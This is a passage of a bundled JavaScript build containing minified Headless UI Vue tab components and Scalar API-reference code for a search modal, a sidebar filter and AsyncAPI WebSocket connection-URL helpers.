					if (a-- <= 0) {
						e && cancelAnimationFrame(e);
						return;
					}
					if ((u = t.onFocus) != null && u.call(t)) {
						n.value = !1, cancelAnimationFrame(e);
						return;
					}
					e = requestAnimationFrame(r);
				}
				e = requestAnimationFrame(r);
			}
		}) : null;
	}
});
//#endregion
//#region node_modules/@headlessui/vue/dist/components/tabs/tabs.js
var te = ((s) => (s[s.Forwards = 0] = "Forwards", s[s.Backwards = 1] = "Backwards", s))(te || {});
var le = ((d) => (d[d.Less = -1] = "Less", d[d.Equal = 0] = "Equal", d[d.Greater = 1] = "Greater", d))(le || {});
var U = Symbol("TabsContext");
function C(a) {
	let b = inject(U, null);
	if (b === null) {
		let s = /* @__PURE__ */ new Error(`<${a} /> is missing a parent <TabGroup /> component.`);
		throw Error.captureStackTrace && Error.captureStackTrace(s, C), s;
	}
	return b;
}
var G = Symbol("TabsSSRContext");
var me = defineComponent({
	name: "TabGroup",
	emits: { change: (a) => !0 },
	props: {
		as: {
			type: [Object, String],
			default: "template"
		},
		selectedIndex: {
			type: [Number],
			default: null
		},
		defaultIndex: {
			type: [Number],
			default: 0
		},
		vertical: {
			type: [Boolean],
			default: !1
		},
		manual: {
			type: [Boolean],
			default: !1
		}
	},
	inheritAttrs: !1,
	setup(a, { slots: b, attrs: s, emit: d$1 }) {
		var E;
		let i = ref((E = a.selectedIndex) != null ? E : a.defaultIndex), l = ref([]), r = ref([]), p = computed(() => a.selectedIndex !== null), R = computed(() => p.value ? a.selectedIndex : i.value);
		function y(t) {
			var c;
			let n = O(u.tabs.value, o), o$2 = O(u.panels.value, o), e = n.filter((I) => {
				var m;
				return !((m = o(I)) != null && m.hasAttribute("disabled"));
			});
			if (t < 0 || t > n.length - 1) {
				let I = u$1(i.value === null ? 0 : Math.sign(t - i.value), {
					[-1]: () => 1,
					[0]: () => u$1(Math.sign(t), {
						[-1]: () => 0,
						[0]: () => 0,
						[1]: () => 1
					}),
					[1]: () => 0
				}), m = u$1(I, {
					[0]: () => n.indexOf(e[0]),
					[1]: () => n.indexOf(e[e.length - 1])
				});
				m !== -1 && (i.value = m), u.tabs.value = n, u.panels.value = o$2;
			} else {
				let I = n.slice(0, t), h = [...n.slice(t), ...I].find((W) => e.includes(W));
				if (!h) return;
				let O = (c = n.indexOf(h)) != null ? c : u.selectedIndex.value;
				O === -1 && (O = u.selectedIndex.value), i.value = O, u.tabs.value = n, u.panels.value = o$2;
			}
		}
		let u = {
			selectedIndex: computed(() => {
				var t, n;
				return (n = (t = i.value) != null ? t : a.defaultIndex) != null ? n : null;
			}),
			orientation: computed(() => a.vertical ? "vertical" : "horizontal"),
			activation: computed(() => a.manual ? "manual" : "auto"),
			tabs: l,
			panels: r,
			setSelectedIndex(t) {
				R.value !== t && d$1("change", t), p.value || y(t);
			},
			registerTab(t) {
				var o$3;
				if (l.value.includes(t)) return;
				let n = l.value[i.value];
				if (l.value.push(t), l.value = O(l.value, o), !p.value) {
					let e = (o$3 = l.value.indexOf(n)) != null ? o$3 : i.value;
					e !== -1 && (i.value = e);
				}
			},
			unregisterTab(t) {
				let n = l.value.indexOf(t);
				n !== -1 && l.value.splice(n, 1);
			},
			registerPanel(t) {
				r.value.includes(t) || (r.value.push(t), r.value = O(r.value, o));
			},
			unregisterPanel(t) {
				let n = r.value.indexOf(t);
				n !== -1 && r.value.splice(n, 1);
			}
		};
		provide(U, u);
		let T$2 = ref({
			tabs: [],
			panels: []
		}), x = ref(!1);
		onMounted(() => {
			x.value = !0;
		}), provide(G, computed(() => x.value ? null : T$2.value));
		let w = computed(() => a.selectedIndex);
		return onMounted(() => {
			watch([w], () => {
				var t;
				return y((t = a.selectedIndex) != null ? t : a.defaultIndex);
			}, { immediate: !0 });
		}), watchEffect(() => {
			if (!p.value || R.value == null || u.tabs.value.length <= 0) return;
			let t = O(u.tabs.value, o);
			t.some((o$4, e) => o(u.tabs.value[e]) !== o(o$4)) && u.setSelectedIndex(t.findIndex((o$5) => o(o$5) === o(u.tabs.value[R.value])));
		}), () => {
			let t = { selectedIndex: i.value };
			return h(Fragment, [l.value.length <= 0 && h(d, { onFocus: () => {
				for (let n of l.value) {
					let o$6 = o(n);
					if ((o$6 == null ? void 0 : o$6.tabIndex) === 0) return o$6.focus(), !0;
				}
				return !1;
			} }), A({
				theirProps: {
					...s,
					...T(a, [
						"selectedIndex",
						"defaultIndex",
						"manual",
						"vertical",
						"onChange"
					])
				},
				ourProps: {},
				slot: t,
				slots: b,
				attrs: s,
				name: "TabGroup"
			})]);
		};
	}
});
var pe = defineComponent({
	name: "TabList",
	props: { as: {
		type: [Object, String],
		default: "div"
	} },
	setup(a, { attrs: b, slots: s }) {
		let d = C("TabList");
		return () => {
			let i = { selectedIndex: d.selectedIndex.value }, l = {
				role: "tablist",
				"aria-orientation": d.orientation.value
			};
			return A({
				ourProps: l,
				theirProps: a,
				slot: i,
				attrs: b,
				slots: s,
				name: "TabList"
			});
		};
	}
});
var xe = defineComponent({
	name: "Tab",
	props: {
		as: {
			type: [Object, String],
			default: "button"
		},
		disabled: {
			type: [Boolean],
			default: !1
		},
		id: {
			type: String,
			default: null
		}
	},
	setup(a, { attrs: b, slots: s$2, expose: d }) {
		var o$7;
		let i$4 = (o$7 = a.id) != null ? o$7 : `headlessui-tabs-tab-${i()}`, l = C("Tab"), r = ref(null);
		d({
			el: r,
			$el: r
		}), onMounted(() => l.registerTab(r)), onUnmounted(() => l.unregisterTab(r));
		let p = inject(G), R = computed(() => {
			if (p.value) {
				let e = p.value.tabs.indexOf(i$4);
				return e === -1 ? p.value.tabs.push(i$4) - 1 : e;
			}
			return -1;
		}), y = computed(() => {
			let e = l.tabs.value.indexOf(r);
			return e === -1 ? R.value : e;
		}), u = computed(() => y.value === l.selectedIndex.value);
		function T(e) {
			var I;
			let c = e();
			if (c === T$1.Success && l.activation.value === "auto") {
				let m = (I = i$1(r)) == null ? void 0 : I.activeElement, h = l.tabs.value.findIndex((O) => o(O) === m);
				h !== -1 && l.setSelectedIndex(h);
			}
			return c;
		}
		function x(e) {
			let c = l.tabs.value.map((m) => o(m)).filter(Boolean);
			if (e.key === o$1.Space || e.key === o$1.Enter) {
				e.preventDefault(), e.stopPropagation(), l.setSelectedIndex(y.value);
				return;
			}
			switch (e.key) {
				case o$1.Home:
				case o$1.PageUp: return e.preventDefault(), e.stopPropagation(), T(() => P(c, N.First));
				case o$1.End:
				case o$1.PageDown: return e.preventDefault(), e.stopPropagation(), T(() => P(c, N.Last));
			}
			if (T(() => u$1(l.orientation.value, {
				vertical() {
					return e.key === o$1.ArrowUp ? P(c, N.Previous | N.WrapAround) : e.key === o$1.ArrowDown ? P(c, N.Next | N.WrapAround) : T$1.Error;
				},
				horizontal() {
					return e.key === o$1.ArrowLeft ? P(c, N.Previous | N.WrapAround) : e.key === o$1.ArrowRight ? P(c, N.Next | N.WrapAround) : T$1.Error;
				}
			})) === T$1.Success) return e.preventDefault();
		}
		let w = ref(!1);
		function E() {
			var e;
			w.value || (w.value = !0, !a.disabled && ((e = o(r)) == null || e.focus({ preventScroll: !0 }), l.setSelectedIndex(y.value), t(() => {
				w.value = !1;
			})));
		}
		function t$3(e) {
			e.preventDefault();
		}
		let n = s(computed(() => ({
			as: a.as,
			type: b.type
		})), r);
		return () => {
			var m, h;
			let e = {
				selected: u.value,
				disabled: (m = a.disabled) != null ? m : !1
			}, { ...c } = a, I = {
				ref: r,
				onKeydown: x,
				onMousedown: t$3,
				onClick: E,
				id: i$4,
				role: "tab",
				type: n.value,
				"aria-controls": (h = o(l.panels.value[y.value])) == null ? void 0 : h.id,
				"aria-selected": u.value,
				tabIndex: u.value ? 0 : -1,
				disabled: a.disabled ? !0 : void 0
			};
			return A({
				ourProps: I,
				theirProps: c,
				slot: e,
				attrs: b,
				slots: s$2,
				name: "Tab"
			});
		};
	}
});
var Ie = defineComponent({
	name: "TabPanels",
	props: { as: {
		type: [Object, String],
		default: "div"
	} },
	setup(a, { slots: b, attrs: s }) {
		let d = C("TabPanels");
		return () => {
			let i = { selectedIndex: d.selectedIndex.value };
			return A({
				theirProps: a,
				ourProps: {},
				slot: i,
				attrs: s,
				slots: b,
				name: "TabPanels"
			});
		};
	}
});
var ye = defineComponent({
	name: "TabPanel",
	props: {
		as: {
			type: [Object, String],
			default: "div"
		},
		static: {
			type: Boolean,
			default: !1
		},
		unmount: {
			type: Boolean,
			default: !0
		},
		id: {
			type: String,
			default: null
		},
		tabIndex: {
			type: Number,
			default: 0
		}
	},
	setup(a, { attrs: b, slots: s, expose: d }) {
		var T;
		let i$5 = (T = a.id) != null ? T : `headlessui-tabs-panel-${i()}`, l = C("TabPanel"), r = ref(null);
		d({
			el: r,
			$el: r
		}), onMounted(() => l.registerPanel(r)), onUnmounted(() => l.unregisterPanel(r));
		let p = inject(G), R = computed(() => {
			if (p.value) {
				let x = p.value.panels.indexOf(i$5);
				return x === -1 ? p.value.panels.push(i$5) - 1 : x;
			}
			return -1;
		}), y = computed(() => {
			let x = l.panels.value.indexOf(r);
			return x === -1 ? R.value : x;
		}), u = computed(() => y.value === l.selectedIndex.value);
		return () => {
			var n;
			let x = { selected: u.value }, { tabIndex: w, ...E } = a, t = {
				ref: r,
				id: i$5,
				role: "tabpanel",
				"aria-labelledby": (n = o(l.tabs.value[y.value])) == null ? void 0 : n.id,
				tabIndex: u.value ? w : -1
			};
			return !u.value && a.unmount && !a.static ? h(f, {
				as: "span",
				"aria-hidden": !0,
				...t
			}) : A({
				ourProps: t,
				theirProps: E,
				slot: x,
				attrs: b,
				slots: s,
				features: N$1.Static | N$1.RenderStrategy,
				visible: u.value,
				name: "TabPanel"
			});
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Search/components/SearchModal.vue.script.js
var _hoisted_1$102 = {
	class: "mb-0 flex flex-col",
	role: "search"
};
var _hoisted_2$64 = {
	"aria-hidden": "true",
	class: "contents"
};
var _hoisted_3$45 = { class: "sr-only" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Search/components/SearchModal.vue.js
var SearchModal_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SearchModal",
	props: {
		modalState: {},
		document: {},
		eventBus: {},
		modelsSectionLabel: {}
	},
	setup(__props) {
		const props = __props;
		const { translate } = useLocalization();
		/** Base id for the search form */
		const id = useId();
		/** An id for the results listbox */
		const listboxId = `${id}-search-result`;
		/** An id for the results instructions */
		const instructionsId = `${id}-search-instructions`;
		const { query, results } = useSearchIndex(() => props.document, () => props.modelsSectionLabel, () => ({
			heading: translate("search.entryHeading"),
			tagGroup: translate("search.entryTagGroup"),
			webhook: translate("search.entryWebhook"),
			webhooks: translate("navigation.webhooks"),
			introduction: translate("navigation.introduction")
		}));
		const selectedIndex = ref(void 0);
		/** Clear the query value when the modal is opened */
		watch(() => props.modalState.open, (open) => {
			if (open) query.value = "";
		});
		/** Keyboard navigation */
		const navigateSearchResults = (direction) => {
			const offset = direction === "up" ? -1 : 1;
			const length = results.value.length;
			if (typeof selectedIndex.value === "number") selectedIndex.value = (selectedIndex.value + offset + length) % length;
			else selectedIndex.value = offset === -1 ? length - 1 : 0;
		};
		/** Handle the selection of a search result */
		function handleSelect(idx) {
			if (typeof idx !== "number" || !results.value[idx]) return;
			const result = results.value[idx];
			props.modalState.hide();
			props.eventBus.emit("scroll-to:nav-item", { id: result.item.id });
		}
		/**
		* Active descendant id for the search input
		* NOTE: Result items MUST share this id for the aria-activedescendant attribute to work correctly
		*/
		const activeDescendantId = computed(() => {
			const selectedResult = results.value[selectedIndex.value ?? -1];
			return selectedResult ? `search-result-${selectedResult.item.id}` : void 0;
		});
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(ScalarModal_default), {
				"aria-label": unref(translate)("search.label"),
				state: __props.modalState,
				variant: "search"
			}, {
				default: withCtx(() => [
					createBaseVNode("div", _hoisted_1$102, [createVNode(unref(ScalarSearchInput_default), {
						modelValue: unref(query),
						"onUpdate:modelValue": _cache[0] || (_cache[0] = ($event) => isRef(query) ? query.value = $event : null),
						"aria-activedescendant": activeDescendantId.value,
						"aria-autocomplete": "list",
						"aria-controls": listboxId,
						"aria-describedby": instructionsId,
						clearLabel: unref(translate)("search.clear"),
						label: unref(translate)("search.inputLabel"),
						placeholder: unref(translate)("search.placeholder"),
						role: "combobox",
						onBlur: _cache[1] || (_cache[1] = ($event) => selectedIndex.value = void 0),
						onKeydown: [
							_cache[2] || (_cache[2] = withKeys(withModifiers(($event) => navigateSearchResults("down"), ["stop", "prevent"]), ["down"])),
							_cache[3] || (_cache[3] = withKeys(withModifiers(() => handleSelect(selectedIndex.value), ["stop", "prevent"]), ["enter"])),
							_cache[4] || (_cache[4] = withKeys(withModifiers(($event) => navigateSearchResults("up"), ["stop", "prevent"]), ["up"]))
						]
					}, null, 8, [
						"modelValue",
						"aria-activedescendant",
						"clearLabel",
						"label",
						"placeholder"
					])]),
					createVNode(unref(ScalarSearchResultList_default), {
						id: listboxId,
						"aria-label": unref(translate)("search.results"),
						class: "custom-scroll px-1 pb-1",
						noResults: !unref(results).length
					}, {
						query: withCtx(() => [createTextVNode(toDisplayString(unref(query)), 1)]),
						default: withCtx(() => [(openBlock(true), createElementBlock(Fragment, null, renderList(unref(results), (result, idx) => {
							return openBlock(), createBlock(SearchResult_default, {
								id: `search-result-${result.item.id}`,
								key: result.refIndex,
								isSelected: selectedIndex.value === idx,
								modelsSectionLabel: props.modelsSectionLabel,
								result,
								onClick: withModifiers(() => handleSelect(idx), ["prevent"])
							}, null, 8, [
								"id",
								"isSelected",
								"modelsSectionLabel",
								"result",
								"onClick"
							]);
						}), 128))]),
						_: 1
					}, 8, ["aria-label", "noResults"]),
					createBaseVNode("div", {
						id: instructionsId,
						class: "ref-search-meta"
					}, [createBaseVNode("span", _hoisted_2$64, [createBaseVNode("span", null, "↑↓ " + toDisplayString(unref(translate)("search.navigate")), 1), createBaseVNode("span", null, "⏎ " + toDisplayString(unref(translate)("search.select")), 1)]), createBaseVNode("span", _hoisted_3$45, toDisplayString(unref(translate)("search.instructions")), 1)])
				]),
				_: 1
			}, 8, ["aria-label", "state"]);
		};
	}
}), [["__scopeId", "data-v-b65d62db"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Search/components/SearchButton.vue.script.js
var _hoisted_1$101 = { class: "sr-only" };
var _hoisted_2$63 = {
	"aria-hidden": "true",
	class: "sidebar-search-placeholder"
};
var _hoisted_3$44 = { class: "sr-only" };
var _hoisted_4$28 = { class: "sr-only" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Search/components/SearchButton.vue.js
var SearchButton_default = /* @__PURE__ */ defineComponent({
	__name: "SearchButton",
	props: {
		forceIcon: { type: Boolean },
		searchHotKey: { default: "k" },
		hideModels: { type: Boolean },
		modelsSectionLabel: { default: () => DEFAULT_MODELS_SECTION_LABEL },
		document: {},
		eventBus: {}
	},
	setup(__props) {
		const button = ref();
		const modalState = useModal();
		const { translate } = useLocalization();
		/**
		* Whether the user is on macOS, used to show the correct shortcut symbol.
		*
		* This must default to `false` so the server-rendered markup and the first
		* client render agree. Detecting the platform relies on `navigator`, which is
		* unavailable during SSR, so we resolve it after mount to avoid a hydration
		* mismatch.
		*/
		const isMac = ref(false);
		onMounted(() => {
			isMac.value = isMacOS();
		});
		const handleHotKey = (e) => {
			if ((isMacOS() ? e.metaKey : e.ctrlKey) && e.key === __props.searchHotKey) {
				e.preventDefault();
				e.stopPropagation();
				if (modalState.open) modalState.hide();
				else modalState.show();
			}
		};
		watch(() => modalState.open, async (next, prev) => {
			if (!next && prev) {
				await nextTick();
				button.value?.$el.focus();
			}
		});
		onMounted(() => window.addEventListener("keydown", handleHotKey));
		onBeforeUnmount(() => window.removeEventListener("keydown", handleHotKey));
		function handleClick() {
			modalState.show();
		}
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock(Fragment, null, [__props.forceIcon ? (openBlock(), createBlock(unref(ScalarIconButton_default), {
				key: 0,
				icon: unref(ScalarIconMagnifyingGlass_default),
				label: unref(translate)("search.label"),
				onClick: handleClick
			}, null, 8, ["icon", "label"])) : (openBlock(), createBlock(unref(ScalarSidebarSearchButton_default), {
				key: 1,
				ref_key: "button",
				ref: button,
				class: normalizeClass(["w-full", _ctx.$attrs.class]),
				shortcutLabel: unref(translate)("search.keyboardShortcut"),
				onClick: handleClick
			}, {
				shortcut: withCtx(() => [isMac.value ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [createBaseVNode("span", _hoisted_3$44, toDisplayString(unref(translate)("search.command")), 1), _cache[0] || (_cache[0] = createBaseVNode("span", { "aria-hidden": "true" }, "⌘", -1))], 64)) : (openBlock(), createElementBlock(Fragment, { key: 1 }, [createBaseVNode("span", _hoisted_4$28, toDisplayString(unref(translate)("search.control")), 1), _cache[1] || (_cache[1] = createBaseVNode("span", { "aria-hidden": "true" }, "⌃", -1))], 64)), createTextVNode(" " + toDisplayString(__props.searchHotKey), 1)]),
				default: withCtx(() => [createBaseVNode("span", _hoisted_1$101, toDisplayString(unref(translate)("search.open")), 1), createBaseVNode("span", _hoisted_2$63, toDisplayString(unref(translate)("search.label")), 1)]),
				_: 1
			}, 8, ["class", "shortcutLabel"])), createVNode(SearchModal_default, {
				document: __props.document,
				eventBus: __props.eventBus,
				modalState: unref(modalState),
				modelsSectionLabel: __props.modelsSectionLabel
			}, null, 8, [
				"document",
				"eventBus",
				"modalState",
				"modelsSectionLabel"
			])], 64);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-asyncapi-sidebar-filters-block/components/SidebarFilter.vue.script.js
var _hoisted_1$100 = { class: "asyncapi-sidebar-filter min-w-0" };
var _hoisted_2$62 = { class: "text-c-1 truncate" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-asyncapi-sidebar-filters-block/components/SidebarFilter.vue.js
var SidebarFilter_default = /* @__PURE__ */ defineComponent({
	__name: "SidebarFilter",
	props: {
		label: {},
		options: {},
		modelValue: {}
	},
	emits: ["update:modelValue"],
	setup(__props, { emit: __emit }) {
		const props = __props;
		const emit = __emit;
		/** Falls back to the first ("All …") option when nothing matches. */
		const selected = computed(() => props.options.find((o) => o.id === props.modelValue) ?? props.options[0]);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("li", _hoisted_1$100, [createVNode(unref(ScalarListbox_default), {
				label: __props.label,
				modelValue: selected.value,
				options: __props.options,
				resize: "",
				teleport: "",
				"onUpdate:modelValue": _cache[0] || (_cache[0] = (e) => emit("update:modelValue", e.id))
			}, {
				default: withCtx(() => [createVNode(unref(ScalarSidebarButton_default), {
					is: "button",
					class: "w-full items-center text-left"
				}, {
					aside: withCtx(() => [createVNode(unref(ScalarIconCaretUpDown_default), {
						class: "text-c-1 ml-1 size-3 shrink-0 self-center",
						weight: "bold"
					})]),
					default: withCtx(() => [createBaseVNode("span", _hoisted_2$62, toDisplayString(selected.value?.label), 1)]),
					_: 1
				})]),
				_: 1
			}, 8, [
				"label",
				"modelValue",
				"options"
			])]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/workspace-store/dist/channel-example/build-connection-url.js
/** AsyncAPI server protocols supported for WebSocket connections in the API client MVP. */
var ASYNCAPI_WEBSOCKET_PROTOCOLS = ["ws", "wss"];
/**
* Extracts default values of variables defined on an AsyncAPI Server Object.
*/
var getAsyncApiServerVariables = (server) => {
	if (!server?.variables) return {};
	return objectEntries(server.variables).reduce((acc, [name, variable]) => {
		const resolved = getResolvedRef(variable);
		if (resolved?.default != null) acc[String(name)] = String(resolved.default);
		return acc;
	}, {});
};
var substituteTemplate = (template, options) => {
	let result = template;
	if (options.serverVariables) result = replacePathVariables(result, options.serverVariables);
	if (options.environmentVariables) result = replaceEnvVariables(result, options.environmentVariables);
	if (options.pathParameters) result = replacePathVariables(result, options.pathParameters);
	return result;
};
/**
* Normalizes an AsyncAPI `protocol` for comparison: trimmed and lowercased.
*
* Returns `undefined` when the protocol is missing or blank, so callers can treat
* "no protocol" distinctly instead of comparing against an empty string.
*/
var normalizeProtocol = (protocol) => {
	const normalized = protocol?.trim().toLowerCase();
	return normalized ? normalized : void 0;
};
/** Maps AsyncAPI `server.protocol` to a URL scheme (MVP: ws and wss). */
var getUrlSchemeFromProtocol = (protocol) => protocol.trim().toLowerCase();
var isWebSocketProtocol = (protocol) => ASYNCAPI_WEBSOCKET_PROTOCOLS.some((scheme) => scheme === protocol.trim().toLowerCase());
/**
* Builds the server base URL: scheme, host, and optional pathname (no channel address).
*/
var buildAsyncApiServerBaseUrl = (server, environmentVariables) => {
	const serverVariables = getAsyncApiServerVariables(server);
	const origin = `${getUrlSchemeFromProtocol(server.protocol)}://${substituteTemplate(server.host, {
		serverVariables,
		environmentVariables
	})}`;
	if (!server.pathname) return origin;
	const pathname = substituteTemplate(server.pathname, {
		serverVariables,
		environmentVariables
	});
	return combineUrlAndPath(origin, pathname);
};
var resolveWsBinding = (bindings) => {
	if (!bindings) return;
	return getResolvedRef(bindings)?.ws;
};
/** Merges channel and operation WebSocket bindings; operation fields override channel. */
var mergeWsBindings = (channel, operation) => {
	const channelBinding = resolveWsBinding(channel.bindings);
	const operationBinding = operation ? resolveWsBinding(operation.bindings) : void 0;
	if (!channelBinding && !operationBinding) return;
	return {
		...channelBinding,
		...operationBinding,
		query: mergeWsQuerySchemas(channelBinding?.query, operationBinding?.query)
	};
};
var resolveWsQuerySchema = (query) => {
	if (!query) return;
	const resolved = getResolvedRef(query);
	if (resolved === true || resolved === false || !isObject(resolved)) return;
	return resolved;
};
var mergeWsQuerySchemas = (channelQuery, operationQuery) => {
	const channelSchema = resolveWsQuerySchema(channelQuery);
	const operationSchema = resolveWsQuerySchema(operationQuery);
	if (!channelSchema && !operationSchema) return;
	if (!channelSchema) return operationQuery;
	if (!operationSchema) return channelQuery;
	const channelProperties = "properties" in channelSchema ? channelSchema.properties : void 0;
	const operationProperties = "properties" in operationSchema ? operationSchema.properties : void 0;
	return Object.assign({}, channelSchema, operationSchema, { properties: {
		...channelProperties,
		...operationProperties
	} });
};
var getDefaultValueFromPropertySchema = (propertySchema) => {
	if (propertySchema === true || propertySchema === false || !isObject(propertySchema)) return;
	if ("default" in propertySchema && propertySchema.default !== void 0) return propertySchema.default;
	if ("example" in propertySchema && propertySchema.example !== void 0) return propertySchema.example;
	if ("enum" in propertySchema && Array.isArray(propertySchema.enum) && propertySchema.enum[0] !== void 0) return propertySchema.enum[0];
};
var appendQueryValue = (params, key, value) => {
	if (value === void 0 || value === null) return;
	if (Array.isArray(value)) {
		value.forEach((entry) => appendQueryValue(params, key, entry));
		return;
	}
	if (typeof value === "object") {
		params.append(key, JSON.stringify(value));
		return;
	}
	params.append(key, String(value));
};
/**
* Builds handshake query parameters from merged `bindings.ws.query` schema defaults,
* then applies explicit overrides.
*/
var buildWsQueryParams = (wsBinding, queryParameters) => {
	const params = new URLSearchParams();
	const querySchema = resolveWsQuerySchema(wsBinding?.query);
	const properties = querySchema && "properties" in querySchema ? querySchema.properties : void 0;
	if (isObject(properties)) for (const [name, propertySchema] of Object.entries(properties)) appendQueryValue(params, name, getDefaultValueFromPropertySchema(propertySchema));
	if (queryParameters) for (const [name, value] of objectEntries(queryParameters)) {
		params.delete(name);
		appendQueryValue(params, name, value);
	}
	return params;
};
/**
* Builds a WebSocket connection URL from a resolved server, channel, and optional operation.
*
* Composition (AsyncAPI 3.x):
* 1. `server.protocol` → URL scheme
* 2. `server.host` (+ variables and environment substitution)
* 3. Optional `server.pathname`
* 4. Channel `address` (+ path parameter substitution)
* 5. Query string from merged `bindings.ws.query` (channel + operation) with schema defaults
*/
var buildConnectionUrl = ({ server, channel, operation = null, pathParameters = {}, queryParameters = {}, environmentVariables }) => {
	const serverVariables = getAsyncApiServerVariables(server);
	const baseUrl = buildAsyncApiServerBaseUrl(server, environmentVariables);
	const address = channel.address;
	if (address == null || address === "") {
		const queryParams = buildWsQueryParams(mergeWsBindings(channel, operation), queryParameters);
		return mergeUrls(baseUrl, "", queryParams, true);
	}
	const resolvedAddress = substituteTemplate(address, {
		serverVariables,
		environmentVariables,
		pathParameters
	});
	const queryParams = buildWsQueryParams(mergeWsBindings(channel, operation), queryParameters);
	return mergeUrls(baseUrl, resolvedAddress, queryParams, true);
};
//#endregion
//#region node_modules/@scalar/workspace-store/dist/helpers/get-name-from-ref.js
/**
* Extracts the trailing identifier from a `#/...` JSON Pointer `$ref` whose parent path matches
* the expected sequence of segments. Decodes `~1`/`~0` escapes so identifiers containing `/` or `~`
* round-trip to their map keys.
*
* Returns `undefined` when the ref does not start with `#/`, the parent path does not match
* exactly, the trailing name is missing, or there are extra segments beyond the name.
*
* @example
* getNameFromRef('#/channels/foo', ['channels']) // → 'foo'
* getNameFromRef('#/components/securitySchemes/tenant~1admin~0v2', ['components', 'securitySchemes']) // → 'tenant/admin~v2'
* getNameFromRef('#/servers/foo/extra', ['servers']) // → undefined
*/
var getNameFromRef = (ref, parentPath) => {
	const prefix = `#/${parentPath.map(escapeJsonPointer).join("/")}/`;
	if (!ref.startsWith(prefix)) return;
	const segmentsResult = safeRun(() => parseJsonPointerSegments(ref.slice(1)));
	if (!segmentsResult.ok) return;
	const segments = segmentsResult.data;
	if (segments.length !== parentPath.length + 1) return;
	for (let i = 0; i < parentPath.length; i++) if (segments[i] !== parentPath[i]) return;
	const name = segments[parentPath.length];
	return name && name.length > 0 ? name : void 0;
};
//#endregion
//#region node_modules/@scalar/workspace-store/dist/channel-example/resolve-operation-channel.js
var getChannelNameFromRef = (ref) => getNameFromRef(ref, ["channels"]);
var findChannelName = (document, channel) => {
	if (!document.channels) return;
	for (const [channelName, channelNode] of Object.entries(document.channels)) if (getResolvedRef(channelNode) === channel) return channelName;
};
/**
* Resolves an operation's channel reference to a channel name, object, and display address.
*/
var resolveOperationChannel = (document, operation) => {
	const channelNode = operation.channel;
	if (!channelNode) return;
	const channelNameFromRef = "$ref" in channelNode ? getChannelNameFromRef(channelNode.$ref) : void 0;
	if (channelNameFromRef && document.channels?.[channelNameFromRef]) {
		const channel = getResolvedRef(document.channels[channelNameFromRef]);
		if (!channel) return void 0;
		return {
			channelName: channelNameFromRef,
			channel,
			channelAddress: typeof channel.address === "string" && channel.address.length > 0 ? channel.address : channelNameFromRef
		};
	}
	const channel = getResolvedRef(channelNode);
	if (!channel) return void 0;
	const channelName = channelNameFromRef ?? findChannelName(document, channel) ?? (typeof channel.address === "string" && channel.address.length > 0 ? channel.address : void 0);
	if (!channelName) return;
	return {
		channelName,
		channel,
		channelAddress: typeof channel.address === "string" && channel.address.length > 0 ? channel.address : channelName
	};
};
//#endregion
//#region node_modules/@scalar/workspace-store/dist/channel-example/servers.js
var resolveServer = (server) => getResolvedRef(server);
var getServerNameFromRef = (ref) => getNameFromRef(ref, ["servers"]);
/**
* Collects the names of `document.servers` entries that the channel is restricted to.
*
* Returns `undefined` when the channel does not declare `servers`, signaling that every
* top-level server is allowed.
*/
var getChannelServerNames = (document, channel) => {
	if (!channel?.servers) return;
	const names = /* @__PURE__ */ new Set();
	for (const serverRef of channel.servers) {
		const name = getServerNameFromRef(serverRef.$ref);
		if (name && document.servers?.[name]) names.add(name);
	}
	return names;
};
/**
* Returns a normalized list of AsyncAPI servers with computed base `url` and optional `connectionUrl`.
*/
var getAsyncApiServers = (document, options = {}) => {
	const { channel = null, operation = null, pathParameters = {}, queryParameters = {}, environmentVariables, webSocketOnly = true } = options;
	const servers = document.servers ?? {};
	const channelServerNames = getChannelServerNames(document, channel);
	return objectEntries(servers).filter(([name]) => channelServerNames?.has(name) ?? true).map(([name, serverRef]) => {
		const server = resolveServer(serverRef);
		if (!server) return void 0;
		const protocol = server.protocol.trim().toLowerCase();
		const isWebSocket = isWebSocketProtocol(protocol);
		const url = buildAsyncApiServerBaseUrl(server, environmentVariables);
		const entry = {
			name,
			server,
			host: server.host,
			protocol,
			description: server.description,
			title: server.title,
			url,
			isWebSocket
		};
		if (channel) entry.connectionUrl = buildConnectionUrl({
			server,
			channel,
			operation,
			pathParameters,
			queryParameters,
			environmentVariables
		});
		return entry;
	}).filter((entry) => entry !== void 0 && (!webSocketOnly || entry.isWebSocket));
};
/**
* Returns the selected AsyncAPI server entry, using `x-scalar-selected-asyncapi-server` on the document.
*/
var getSelectedAsyncApiServer = (document, servers, _operation) => {
	if (!isAsyncApiDocument(document)) return servers[0] ?? null;
	const selectedName = document["x-scalar-selected-server"];
	if (selectedName == null) return servers[0] ?? null;
	return servers.find(({ name }) => name === selectedName) ?? servers[0] ?? null;
};
/**
* Returns the protocol of every named server, keyed by server name.
* References are resolved so a `$ref`-only server still contributes its protocol.
*/
var getServerProtocols = (document) => {
	const protocols = /* @__PURE__ */ new Map();
	for (const [name, serverNode] of objectEntries(document.servers ?? {})) {
		const protocol = normalizeProtocol(getResolvedRef(serverNode)?.protocol);
		if (protocol) protocols.set(name, protocol);
	}
	return protocols;
};
/**
* Builds the protocol options for the picker from a document's servers.
*
* Always prepends an "All protocols" entry so the picker can clear the filter,
* matching how the document picker always offers every document. Protocols are
* de-duplicated and sorted alphabetically for a stable order.
*/
var getAsyncApiProtocols = (document) => {
	return [{
		id: "all",
		label: "All protocols"
	}, ...[...new Set(getServerProtocols(document).values())].sort((a, b) => a.localeCompare(b)).map((protocol) => ({
		id: protocol,
		label: protocol.toUpperCase()
	}))];
};
/**
* Builds the server options for the picker from a document's servers.
*
* Like {@link getAsyncApiProtocols}, always prepends an "All servers" entry so the
* filter can be cleared. Each option is labelled with the server name and its
* protocol so the picker reads as `mqtt-prod (mqtt)`.
*/
var getAsyncApiServerOptions = (document) => {
	return [{
		id: "all",
		label: "All servers"
